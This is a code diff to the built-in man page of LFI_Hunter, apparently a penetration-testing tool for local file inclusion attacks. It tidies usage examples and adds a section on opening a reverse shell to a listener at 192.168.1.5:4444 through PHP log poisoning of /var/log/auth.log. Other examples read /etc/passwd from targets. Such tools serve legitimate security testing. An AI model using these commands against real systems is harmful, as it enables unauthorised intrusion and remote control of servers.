@@ -29,11 +29,11 @@ class ManPage:
                      It is available on GitHub: https://github.com/jac11/LFI_Hunter.
               OPTIONS
                      -h, --help                      show this help message and exit
-                     --man                           see man page
-                     -UV, --Vulnurl                  Target URL for the vulnerable web application (required)
+                     --man                           show this man page
+                     -UV, --Vulnurl                  Target URL for the vulnerable web application 
                      --auth                          Enable authentication mode
                      -F, --filelist                  Read from an LFI wordlist file
-                     -C, --Cookie                    Provide the login session cookie
+                     -C, --Cookie     (required)     Provide the login session cookie              
                      -B, --base64                    Enable decoding of base64-filtered PHP code
                      -R, --read                      Specify a file to read from the target machine
                      -UF, --UserForm                 Specify the HTML login form username field
@@ -56,7 +56,7 @@ class ManPage:
                             Specifies the target URL for the web application vulnerable to LFI. 
                             The URL must include the path where testing will be performed.
                             Example:
-                            LFI_Hunter -UV http://example.com/-UV http://example.com/vulnerable_path?file=   -C -C session_cookie.txt 
+                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt 
 
                      --auth
 
@@ -68,12 +68,10 @@ class ManPage:
 
                             Specifies a wordlist file containing paths or filenames to attempt during the LFI attack. 
                             The tool will iterate through each line of the wordlist to identify vulnerable files.
+                            by default if not wordlist specified. tool will Using the internal default wordlist.
                             Example:
-                            LFI_Hunter -UV http://example.com/-UV http://example.com/vulnerable_path?file=   -C -C session_cookie.txt  -F lfi_wordlist.txt
-                            default_wordlist
-                            by default if not wordlist specified. tool will Using the internal default wordlist
-
-
+                            LFI_Hunter -UV http://example.com/vulnerable_path?file=   -C session_cookie.txt  -F lfi_wordlist.txt
+                           
 
                      -C, --Cookie FILE
 
@@ -106,7 +104,7 @@ class ManPage:
                             Specifies a file to attempt reading from the target machine. 
                             Common file paths for LFI attacks include /etc/passwd and configuration files.
                             Example:
-                            LFI_Hunter -UV http://example.com/-UV http://example.com/vulnerable_path?file=  -C session_cookie.txt  -R /etc/passwd
+                            LFI_Hunter  -UV http://example.com/vulnerable_path?file=  -C session_cookie.txt  -R /etc/passwd
 
                      -UF, --UserForm FIELD
 
@@ -124,8 +122,8 @@ class ManPage:
 
                      -P, --password PASSWORD
 
-                            Allows the direct input of a password for login attempts. For security, 
-                            consider using this option with caution or combining it with --auth.
+                            Allows the direct input of a password for login attempts.
+                            For consider using this option with caution or combining it with --auth. 
                             Example:
                             LFI_Hunter -LU http://example.com/login  -UV http://example.com/vulnerable_path?file= -C session_cookie.txt  --auth -U admin -P mypassword
 
@@ -141,21 +139,21 @@ class ManPage:
                             Provides the login URL for applications where the login path differs from the main application path. 
                             This can streamline access to restricted areas of the site.
                             Example:
-                            LFI_Hunter -UV http://example.com/-UV http://example.com/vulnerable_path?file=  -C session_cookie.txt  --auth -LU http://example.com/login
+                            LFI_Hunter -UV http://example.com/vulnerable_path?file=  -C session_cookie.txt  --auth -LU http://example.com/login
 
                      -U, --user USERNAME
 
                             Specifies a username for login attempts, allowing interaction with 
                             the authenticated sections of the application.
                             Example:
-                            LFI_Hunter -UV http://example.com/-UV http://example.com/vulnerable_path?file= -C session_cookie.txt /login --auth -U admin
+                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt /login --auth -U admin
 
                      -u, --readuser FILE
 
                             Reads the username from a specified file instead of entering it directly. 
                             Useful for testing multiple usernames.
                             Example:
-                            LFI_Hunter -UV http://example.com/-UV http://example.com/vulnerable_path?file= -C session_cookie.txt /login --auth -u usernames.txt
+                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt /login --auth -u usernames.txt
 
                      -A, --Aggressiv
 
@@ -167,6 +165,20 @@ class ManPage:
                             Example:
                             LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -A
 
+                     -S, --shell CONNECTION
+
+                            Sets up a reverse shell connection to a specified IP address,defining the listener (LHOST). 
+                            If the target system is vulnerable,this feature enables remote access for testing purposes. 
+                            Use this option to specify the IP address and port .
+
+                            Additionally, if the tool can read a log or authentication file, 
+                            it can inject (or "poison") the log file with PHP code to establish a reverse shell. 
+                            This technique allows for shell access when standard methods are restricted.
+
+                            Examples:
+                            This command specifies /var/log/auth.log as the target file for log poisoning.
+                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -S 192.168.1.5 --port 4444 -R /var/log/auth.log
+                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -S 192.168.1.5 --port 4444 -Z
 
                      --port PORT
 
@@ -174,16 +186,8 @@ class ManPage:
                             such as reverse shells. This option allows the tool to use a custom port instead of the default.
                             If not specified, the listener will default to port 7777.
                             Example:
-                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -S 192.168.1.5 --port 4444
-
-                     -S, --shell CONNECTION
-
-                            Sets up a reverse shell connection to a specified IP address, defining the listener host (LHOST).
-                            If the target system is vulnerable, this feature enables remote access for testing purposes. 
-                            Include the IP address and port as LHOST .
-                            Example:
-                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -S 192.168.1.5 -port 4444
-
+                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -S 192.168.1.5 --port 4444 R /var/log/auth.log 
+                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -S 192.168.1.5 --port 4444 -Z        
 
                      -Z, --fuzzing
 
@@ -191,7 +195,7 @@ class ManPage:
                             attempting a wide range of values for parameters to test 
                             for potential vulnerabilities .
                             Example:
-                            LFI_Hunter -LU http://example.com/login  -UV http://example.com/vulnerable_path?file= -C session_cookie.txt  --auth -Z
+                            LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -Z
 
 
                      --config FILE
